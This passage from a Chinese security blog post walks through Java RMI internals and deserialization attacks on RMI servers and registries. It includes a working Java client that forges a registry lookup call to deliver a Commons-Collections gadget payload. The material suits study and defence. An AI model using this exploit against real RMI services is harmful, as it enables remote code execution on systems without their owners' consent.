class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//查找注册中心</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(RMIServer.RMIHOST,RMIServer.RMIPORT);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//通过获得的注册中心查找远程对象 如果找到的话会返回该远程对象</span></span><br><span class="line">            <span class="type">RMIInterface</span> <span class="variable">rmiInterface</span> <span class="operator">=</span> (RMIInterface) registry.lookup(<span class="string">&quot;demo&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//调用远程对象中的方法</span></span><br><span class="line">            rmiInterface.hello();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="RMI攻击"><a href="#RMI攻击" class="headerlink" title="RMI攻击"></a>RMI攻击</h2><p>RMI服务底层调用的是<strong>JRMP协议</strong>  </p>
+<p>RMI服务默认使用该协议传输数据</p>
+<p>JRMP协议在传输数据的时候会自动的序列化对象 以便传输数据</p>
+<p>那么这里就存在可以利用的漏洞了</p>
+<h3 id="RMI服务端攻击"><a href="#RMI服务端攻击" class="headerlink" title="RMI服务端攻击"></a>RMI服务端攻击</h3><p>如果一个RMI服务存在一个远程对象的方法可以接受一个对象参数</p>
+<p>那么我们可以直接传入一个我们构造好的恶意类 当RMI服务端序列化该类的时候 就会执行我们恶意的代码</p>
+<p>这里在实现类中增添了一个接口Object对象的参数</p>
+<p><img src="/2026/03/27/RMI/image-20260327210003636.png" alt="image-20260327210003636"></p>
+<p>我们只需在Client上面传入一个cc1包装好的恶意类 即可实现攻击</p>
+<p><img src="/2026/03/27/RMI/image-20260327210134090.png" alt="image-20260327210134090"></p>
+<p>这种方法需要远程对象<strong>接受一个Object参数 才能触发</strong></p>
+<p>但是如果是Hashmap或者Hashtable之类的 我们也可以将恶<strong>意类藏在这之中也可以实现攻击</strong></p>
+<p>反过来看 如果<strong>服务端的远程对象返回一个恶意类 客户端也一样的可能中招</strong></p>
+<hr>
+<h3 id="Register攻击"><a href="#Register攻击" class="headerlink" title="Register攻击"></a>Register攻击</h3><p>如果远程对象方法没法被利用 可以直接攻击注册中心</p>
+<p>我们可以构造一个<strong>Remote对象</strong> 并将其传给注册中心 <strong>注册中心也会自动的反序列化这个对象</strong> 这时就可能<strong>触发漏洞</strong></p>
+<p><img src="/2026/03/27/RMI/image-20260329141422132.png" alt="image-20260329141422132"></p>
+<p>客户端这里我通过向注册表发送一个对象绑定请求 要求将<strong>demo对象绑定为我们发送过去的类</strong></p>
+<p>这里发送的对象正是我们包装好的恶意类 一旦接收便会自动序列化 从而触发执行</p>
+<p><strong>注意</strong>:这里bind的对象一定要是Remote对象 所以我们在bind之前就包装了一个代理类 强行继承Remote接口</p>
+<p><img src="/2026/03/27/RMI/image-20260329141638907.png" alt="image-20260329141638907"></p>
+<p>注册表中的其他几个方法也会触发反序列化</p>
+<p><strong>bind rebind</strong> 正如上面演示的一样 直接发送对象即可</p>
+<p>bind unbind rebind 只能在本地调用 没啥用</p>
+<p>RegistryImpl_Skel.dispatch中执行指定方法之后 又会调用RegistryImp的指定方法</p>
+<p><img src="/2026/03/27/RMI/image-20260402105847072.png" alt="image-20260402105847072"></p>
+<p>然后会进入RegistryImpl的方法</p>
+<p><img src="/2026/03/27/RMI/image-20260402110046189.png" alt="image-20260402110046189"></p>
+<p>除了lookup没有调用<strong>checkAccess</strong> 其他都会调用</p>
+<p>RegistryImpl中的checkAccess判断当前客户端的ip是否与服务器一样</p>
+<p><img src="/2026/03/27/RMI/image-20260330112908331.png" alt="image-20260330112908331"></p>
+<p><strong>lookup</strong> 这个方法只能传字符串 该怎么触发序列化呢? 现在应该回到底层代码看看具体是个什么情况</p>
+<hr>
+<h2 id="RMI底层代码"><a href="#RMI底层代码" class="headerlink" title="RMI底层代码"></a>RMI底层代码</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/picture-word?id=234">详细解析</a></p>
+<p>RMI服务中有几个关键api</p>
+<h3 id="java-rmi-Remote"><a href="#java-rmi-Remote" class="headerlink" title="java.rmi.Remote"></a>java.rmi.Remote</h3><p><img src="/2026/03/27/RMI/image-20260329143316468.png" alt="image-20260329143316468"></p>
+<p>Remote接口仅仅作为一个说明 继承该接口的类 在后面的使用中可以作为远程对象</p>
+<h3 id="java-rmi-server-UnicastRemoteObject"><a href="#java-rmi-server-UnicastRemoteObject" class="headerlink" title="java.rmi.server.UnicastRemoteObject"></a>java.rmi.server.UnicastRemoteObject</h3><p><img src="/2026/03/27/RMI/image-20260329143527019.png" alt="image-20260329143527019"></p>
+<p><strong>UnicastRemoteObject类是实现将对象转化为一个远程对象的必要条件</strong> </p>
+<p>按理来说 Remote接口的实现类应该要<strong>显式的继承这个UnicastRemoteObject类</strong> 它将自动完成转化</p>
+<p><img src="/2026/03/27/RMI/image-20260329144324028.png" alt="image-20260329144324028"></p>
+<p>我们可以来看看这个父类的构造器干了什么事</p>
+<p><img src="/2026/03/27/RMI/image-20260329144400774.png" alt="image-20260329144400774"></p>
+<p>它会自动的将这个实现类导出为远程对象代理类 所以我们不必显式的exportObject出一个远程对象代理类 </p>
+<h3 id="RMI的动态类加载"><a href="#RMI的动态类加载" class="headerlink" title="RMI的动态类加载"></a>RMI的动态类加载</h3><p>RMI还可以使用动态类加载和安全管理器来安全传输Java类</p>
+<p><code>java.rmi.server.codebase</code>：该属性表示一个或多个URL位置，可以从中下载本地（<code>CLASSPATH</code>）找不到的类，相当于一个代码库。</p>
+<p>对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，客户端就需要从服务端提供的<code>java.rmi.server.codebase</code>URL去加载类</p>
+<p>对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的子类，那么服务端需要从客户端提供的<code>java.rmi.server.codebase</code>URL去加载对应的类。</p>
+<p>客户端与服务端两边的<code>java.rmi.server.codebase</code>URL都是互相传递的。</p>
+<p>无论是客户端还是服务端要远程加载类，都需要满足：</p>
+<ol>
+<li>由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并配置java.security.policy</li>
+<li>属性java.rmi.server.useCodebaseOnly的值必须为false</li>
+</ol>
+<p>指定<code>java.rmi.server.codebase</code></p>
+<hr>
+<h3 id="创建注册中心"><a href="#创建注册中心" class="headerlink" title="创建注册中心"></a>创建注册中心</h3><p>跟进一下LocateRegistry.createRegistry方法</p>
+<p><img src="/2026/03/27/RMI/image-20260330121105834.png" alt="image-20260330121105834"></p>
+<p>会实例化一个RegistryImpl对象 </p>
+<p><img src="/2026/03/27/RMI/image-20260330121057826.png" alt="image-20260330121057826"></p>
+<p>来到构造器当中</p>
+<p><img src="/2026/03/27/RMI/image-20260330121234866.png" alt="image-20260330121234866"></p>
+<p>jdk源码中默认想要注册中心开在1099号上</p>
+<p>但是我们这里是1234 直接就进入到else语句中</p>
+<p><img src="/2026/03/27/RMI/image-20260330121906226.png" alt="image-20260330121906226"></p>
+<p>实例化LiveRef 并传入id与port</p>
+<p><img src="/2026/03/27/RMI/image-20260330122004353.png" alt="image-20260330122004353"></p>
+<p>进入LiveRef 的构造器中 又会调用其他类型的构造器</p>
+<p>进入到TCPEndpoint.getLocalEndpoint()当中</p>
+<p><img src="/2026/03/27/RMI/image-20260330122102555.png" alt="image-20260330122102555"></p>
+<p>这里又会进入另一个getLocalEndpoint()</p>
+<p><img src="/2026/03/27/RMI/image-20260330122145992.png" alt="image-20260330122145992"></p>
+<p>这里实际上底层获取服务器ip信息的方法</p>
+<p>直接跳到方法的最后 看看具体参数</p>
+<p><img src="/2026/03/27/RMI/image-20260330122524435.png" alt="image-20260330122524435"></p>
+<p>看到最后会返回我们的出口ip与刚刚绑定到port </p>
+<p>到现在开始LiveRef的实例化</p>
+<p><img src="/2026/03/27/RMI/image-20260330122730125.png" alt="image-20260330122730125"></p>
+<p>将刚刚获取到的一些信息都绑定在LiveRef上</p>
+<p><img src="/2026/03/27/RMI/image-20260330123000894.png" alt="image-20260330123000894"></p>
+<p>现在LiveRef初始化就结束了</p>
+<p><img src="/2026/03/27/RMI/image-20260330123034874.png" alt="image-20260330123034874"></p>
+<p>进入到setup中 会先实例化UnicastServerRef对象 并将刚刚的LiveRef传到其构造器当中</p>
+<p><img src="/2026/03/27/RMI/image-20260330123133087.png" alt="image-20260330123133087"></p>
+<p>传入父类构造器中</p>
+<p><img src="/2026/03/27/RMI/image-20260330123155857.png" alt="image-20260330123155857"></p>
+<p>只是简单赋值</p>
+<p><img src="/2026/03/27/RMI/image-20260330123309413.png" alt="image-20260330123309413"></p>
+<p>进入setup中 会调用UnicastServerRef.exportObject</p>
+<p>this就是RegistryImpl对象</p>
+<p><img src="/2026/03/27/RMI/image-20260330123419259.png" alt="image-20260330123419259"></p>
+<p>此时开始构造代理对象</p>
+<p><img src="/2026/03/27/RMI/image-20260330123522755.png" alt="image-20260330123522755"></p>
+<p>先进入getClientRef</p>
+<p><img src="/2026/03/27/RMI/image-20260330123609572.png" alt="image-20260330123609572"></p>
+<p>又会调用UnicastRef的构造器</p>
+<p>现在进入creatProxy</p>
+<p><img src="/2026/03/27/RMI/image-20260330123713573.png" alt="image-20260330123713573"></p>
+<p>进入到stubClassExists方法中</p>
+<p><img src="/2026/03/27/RMI/image-20260330131013607.png" alt="image-20260330131013607"></p>
+<p>检测内部是否有stub 返回false</p>
+<p>然后回加载一个类 RegistryImpl_stub 返回true </p>
+<p><img src="/2026/03/27/RMI/image-20260330131539655.png" alt="image-20260330131539655"></p>
+<p>现在开始创建Stub </p>
+<p>Stub是之后要传给客户端用的代理类</p>
+<p><img src="/2026/03/27/RMI/image-20260330131825199.png" alt="image-20260330131825199"></p>
+<p>这里又加载了一个类</p>
+<p>var2 &#x3D; sun.rmi.registry.RegistryImpl_Stub 和刚刚加载的类一样</p>
+<p>var3获得这个stub的class类</p>
+<p><img src="/2026/03/27/RMI/image-20260330132322777.png" alt="image-20260330132322777"></p>
+<p>最后返回这个RemoteStub对象</p>
+<p><img src="/2026/03/27/RMI/image-20260330132437582.png" alt="image-20260330132437582"></p>
+<p>var5得到stub对象后调用setSkeleton</p>
+<p><img src="/2026/03/27/RMI/image-20260330132543915.png" alt="image-20260330132543915"></p>
+<p>又会调用createSkeleton</p>
+<p><img src="/2026/03/27/RMI/image-20260330132631652.png" alt="image-20260330132631652"></p>
+<p>这个createSkeleton和刚刚createStub没什么区别</p>
+<p><img src="/2026/03/27/RMI/image-20260330132745025.png" alt="image-20260330132745025"></p>
+<p>最后在UnicastServerRef中 skel被赋值为刚刚创建的skeleton</p>
+<p><img src="/2026/03/27/RMI/image-20260330132852166.png" alt="image-20260330132852166"></p>
+<p>创建Target实例</p>
+<p><img src="/2026/03/27/RMI/image-20260330133010027.png" alt="image-20260330133010027"></p>
+<p>将之前创建的一些东西都存在这个Target对象中</p>
+<p><img src="/2026/03/27/RMI/image-20260330133549727.png" alt="image-20260330133549727"></p>
+<p>然后又调用exportobject</p>
+<p><img src="/2026/03/27/RMI/image-20260330133657665.png" alt="image-20260330133657665"></p>
+<p>又是经过多次的exportobject调用 现在开始监听指定端口了</p>
+<p><img src="/2026/03/27/RMI/image-20260330133916993.png" alt="image-20260330133916993"></p>
+<p>上面会查找ip与port</p>
+<p>接着进入newServerSocket</p>
+<p><img src="/2026/03/27/RMI/image-20260330134207427.png" alt="image-20260330134207427"></p>
+<p><img src="/2026/03/27/RMI/image-20260330134403068.png" alt="image-20260330134403068"></p>
+<p><img src="/2026/03/27/RMI/image-20260330134445293.png" alt="image-20260330134445293"></p>
+<p><img src="/2026/03/27/RMI/image-20260330134539747.png" alt="image-20260330134539747"></p>
+<p><img src="/2026/03/27/RMI/image-20260330134622885.png" alt="image-20260330134622885"></p>
+<p>这里都是比较底层的调用 最终的结果就是在所有网络接口上监听1234端口</p>
+<p><img src="/2026/03/27/RMI/image-20260330134938976.png" alt="image-20260330134938976"></p>
+<p>如果没有指定端口 会调用默认端口号</p>
+<p><img src="/2026/03/27/RMI/image-20260330135001569.png" alt="image-20260330135001569"></p>
+<p><img src="/2026/03/27/RMI/image-20260330135104675.png" alt="image-20260330135104675"></p>
+<p>最终结果就是这个ServerSocket</p>
+<p>到这里 基本就结束了</p>
+<p>过程中创建了RegisterImpl_Stub RegisterImpl_Skeleton</p>
+<p>UnicastServerRef类与UnicastRef类 起到底层网络处理的作用</p>
+<p>注册中心服务 默认绑定在所有网络接口上的指定端口</p>
+<p>上面出现的一个奇怪的ip按理来说应该是我们的本地局域网ip 但是我本地有个虚拟网卡服务 它自动获取ip的时候弄错了 </p>
+<p><strong>所以默认情况下是绑定在本地局域网中的</strong></p>
+<p>当然也可以显式的修改</p>
+<p><strong><code>System.setProperty(&quot;java.rmi.server.hostname&quot;,RMIHOST</code></strong></p>
+<h3 id="远程对象创建"><a href="#远程对象创建" class="headerlink" title="远程对象创建"></a>远程对象创建</h3><p>跟进一下这个接口实现类的实例化 也就是远程对象实例化</p>
+<p><img src="/2026/03/27/RMI/image-20260330211302104.png" alt="image-20260330211302104"></p>
+<p>调用父类的构造器</p>
+<p><img src="/2026/03/27/RMI/image-20260330211333734.png" alt="image-20260330211333734"></p>
+<p>跳到这个构造器上</p>
+<p><img src="/2026/03/27/RMI/image-20260330211424308.png" alt="image-20260330211424308"></p>
+<p>跟进一下这个exportobject</p>
+<p><img src="/2026/03/27/RMI/image-20260330211535137.png" alt="image-20260330211535137"></p>
+<p>其实前面部分和注册中心没什么区别</p>
+<p>关注这里</p>
+<p><img src="/2026/03/27/RMI/image-20260330211609878.png" alt="image-20260330211609878"></p>
+<p><img src="/2026/03/27/RMI/image-20260330211624725.png" alt="image-20260330211624725"></p>
+<p>继续跟进creatProxy</p>
+<p><img src="/2026/03/27/RMI/image-20260330211850223.png" alt="image-20260330211850223"></p>
+<p>返回一个接口实例对象</p>
+<p><img src="/2026/03/27/RMI/image-20260330212415510.png" alt="image-20260330212415510"></p>
+<p>后面又会开启一个监听 因为在exportObject的时候 都是直接调用父类的的默认构造器 所以这里的port是一个随机的</p>
+<p>这个服务就是远程对象服务</p>
+<p><img src="/2026/03/27/RMI/image-20260330212642556.png" alt="image-20260330212642556"></p>
+<p>最终放回接口实现对象</p>
+<h3 id="简单看看Client查找注册中心与查找远程对象"><a href="#简单看看Client查找注册中心与查找远程对象" class="headerlink" title="简单看看Client查找注册中心与查找远程对象"></a>简单看看Client查找注册中心与查找远程对象</h3><p><img src="/2026/03/27/RMI/image-20260330220412957.png" alt="image-20260330220412957"></p>
+<p>调用其他的getRegistry</p>
+<p><img src="/2026/03/27/RMI/image-20260330220449169.png" alt="image-20260330220449169"></p>
+<p><img src="/2026/03/27/RMI/image-20260330220535004.png" alt="image-20260330220535004"></p>
+<p>又是回到了这个createProxy</p>
+<p><img src="/2026/03/27/RMI/image-20260330220739401.png" alt="image-20260330220739401"></p>
+<p>进入createStub</p>
+<p><img src="/2026/03/27/RMI/image-20260330220816933.png" alt="image-20260330220816933"></p>
+<p><img src="/2026/03/27/RMI/image-20260330221258782.png" alt="image-20260330221258782"></p>
+<p>最后返回注册中心实现对象的stub存根</p>
+<p><img src="/2026/03/27/RMI/image-20260330221115591.png" alt="image-20260330221115591"></p>
+<p>我们拿着这个stub去找远程对象</p>
+<p>来到下面的查找远程对象</p>
+<p><img src="/2026/03/27/RMI/image-20260330221610247.png" alt="image-20260330221610247"></p>
+<p>newCall一个远程请求 里面要放一下请求信息</p>
+<p>然后在通过父类的ref.invoke去发送</p>
+<p><img src="/2026/03/27/RMI/image-20260330222027842.png" alt="image-20260330222027842"></p>
+<p>executecall</p>
+<p><img src="/2026/03/27/RMI/image-20260330222057900.png" alt="image-20260330222057900"></p>
+<p>这里releaseoutputStream会发送请求</p>
+<p>最后又回到lookup中 并反序列化结果</p>
+<p><img src="/2026/03/27/RMI/image-20260330222305917.png" alt="image-20260330222305917"></p>
+<p><img src="/2026/03/27/RMI/image-20260330222610306.png" alt="image-20260330222610306"></p>
+<p>done会返回一个DGC 垃圾处理</p>
+<p>var23就是我们最后的对象</p>
+<p><img src="/2026/03/27/RMI/image-20260330222640410.png" alt="image-20260330222640410">最后返回的是一个动态代理对象 通过这个代理对象去调用服务</p>
+<hr>
+<h3 id="如何利用lookup触发反序列化"><a href="#如何利用lookup触发反序列化" class="headerlink" title="如何利用lookup触发反序列化"></a>如何利用lookup触发反序列化</h3><p>来调试一下lookup方法</p>
+<p><img src="/2026/03/27/RMI/image-20260329173338262.png" alt="image-20260329173338262"></p>
+<p>不难发现 当调用注册表的lookup时候 实际调用了RegisterImpl_Stub中的lookup方法 </p>
+<p>紧接着 他又会调用父类的ref中的<strong>newCall</strong>方法</p>
+<p>newCall方法会创建一个RemoteCall</p>
+<p>最终由父类的ref去invoke 传输上面序列化的数据 服务端收到数据会反序列化 </p>
+<p><img src="/2026/03/27/RMI/image-20260402102438447.png" alt="image-20260402102438447"></p>
+<p>那么如果 RemoteCall序列化的对象不是我们传入的<strong>字符串</strong> 而是一个恶意类 那么就可以达到触发反序列化漏洞的效果</p>
+<p>但是lookup只能传入字符串 所以我们得伪造这个RemoteCall 然后去修改序列化的内容</p>
+<p><img src="/2026/03/27/RMI/image-20260402102709519.png" alt="image-20260402102709519"></p>
+<p>首先要伪造RemoteCall </p>
+<p>this也就是Registry_Stub我们有 主要是<strong>获取super.ref与operations</strong></p>
+<p>这2个也没什么难的 反射获取成员属性即可 然后setAccessible(true)就可以了</p>
+<p>最后<strong>调用super.ref传输恶意类序列化数据</strong>就可以了</p>
+<p>总的来说就是伪造一次请求 把我们的恶意类给传过去</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(RMIServer.RMIHOST,RMIServer.RMIPORT);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">payload</span> <span class="operator">=</span> (InvocationHandler) cc1.payload();</span><br><span class="line"></span><br><span class="line">            <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;,payload);</span><br><span class="line"></span><br><span class="line">            evilLookup(registry,r);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">evilLookup</span><span class="params">(Registry r, Object evilObject)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ref</span> <span class="operator">=</span> r.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        ref.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">Ref</span> <span class="operator">=</span> (UnicastRef)ref.get(r);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">operations</span> <span class="operator">=</span> r.getClass().getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        operations.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] Operations = (Operation[]) operations.get(r);</span><br><span class="line"></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">remoteCall</span> <span class="operator">=</span> Ref.newCall((RemoteObject) r, Operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">objectOutput</span> <span class="operator">=</span> remoteCall.getOutputStream();</span><br><span class="line">        objectOutput.writeObject(evilObject);</span><br><span class="line">        Ref.invoke(remoteCall);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">● 0-&gt;bind</span><br><span class="line">● 1-&gt;list</span><br><span class="line">● 2-&gt;lookup</span><br><span class="line">● 3-&gt;rebind</span><br><span class="line">● 4-&gt;unbind</span><br></pre></td></tr></table></figure>
+
+<p>我们看看服务端收到序列化数据是个什么情况</p>
+<p>当收到数据的时候 是<strong>RegistryImpl_Skel.dispatch</strong>去处理</p>
+<p>会进入一个switch-case语句 数字分别代表不同的方法</p>
+<p>look up是2</p>
+<p><img src="/2026/03/27/RMI/image-20260402103321100.png" alt="image-20260402103321100"></p>
+<p>很明显 当收到lookup请求 直接就是readobject() </p>
+<p>就直接触发反序列化了</p>
+<p><img src="/2026/03/27/RMI/image-20260402103550719.png" alt="image-20260402103550719"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>客户端调用远程对象时将获取stub</p>
+<p>调用具体方法的时候是stub将请求交UnicastRef UnicastRef又给RemoteRef 并调用RemoteCall 接着序列化 发送并交给Skeleton</p>
+<p>Skeleton再将序列化数据 反序列化得到原始数据 通过具体的调用方法 执行相应的逻辑 并将结果 序列化发送</p>
+<p>客户端接收并反序列化结果，获取远程对象的引用。  </p>
+<p>客户端后续对远程方法的调用，会由服务端通过反射执行实际实现类的方法。  </p>
+<p>服务端序列化方法执行结果返回，客户端反序列化并得到最终调用结果</p>
+<p>服务端触发漏洞都源于RegistryImpl_Skeleton中readobject调用</p>
+<p><img src="/2026/03/27/RMI/image-20260329221704072.png" alt="image-20260329221704072"></p>
+<p>客户端的序列化则来自RegistryImpl_Stub中的readobject调用</p>
+<p><img src="/2026/03/27/RMI/image-20260401163011923.png" alt="image-20260401163011923"></p>
+<p>当动态加载类的时候 如果本地找不到这个类 会尝试去指定网站上下载</p>
+<p>codebase &#x3D; “<a target="_blank" rel="noopener" href="http://127.0.0.1/eval.class">http://127.0.0.1/eval.class</a>“</p>
+<p><code>java.rmi.server.useCodebaseOnly</code> 这个系统属性是从 <strong>JDK 6u45、7u21 和 8u121</strong> 之后都默认设置为 true 只能加载本地.class</p>
+<p><strong>RMI主要可利用的是注册中心的lookup &#x2F; Naming.lookup()</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/java/" rel="tag" title="java">java</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%94%BB%E5%87%BB%E9%9D%A2/" rel="tag" title="攻击面">攻击面</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E7%9F%A5%E8%AF%86/" rel="tag" title="知识">知识</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap left">
+        
+          
+          
+            <img data-src="/covers/51402039_p0_master1200.jpg" data-sizes="auto" alt="JRMP" class="lazyload">
+          
+        
+        <a href="/2026/03/27/JRMP/" aria-label="前一篇: JRMP" title="前一篇: JRMP"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            JRMP
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap right">
+      
+        
+        
+          <img data-src="/covers/Image_1719707491177.jpg" data-sizes="auto" alt="URLDNS链" class="lazyload">
+        
+      
+      <a href="/2026/03/26/URLDNS%E9%93%BE/" aria-label="后一篇: URLDNS链"  title="后一篇: URLDNS链"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          URLDNS链
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+      
+      
+        
+      
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            
+            <div class="selector-item" data-selector="gitalk">
+              <span>gitalk</span>
+            </div>
+            
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+      
+        <div class="comment gitalk-comment" data-aos="fade-up"
+          id="gitalk-comment">
+        </div>
+      
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2025-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      S@Ku_yA
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        37.9k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:53
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
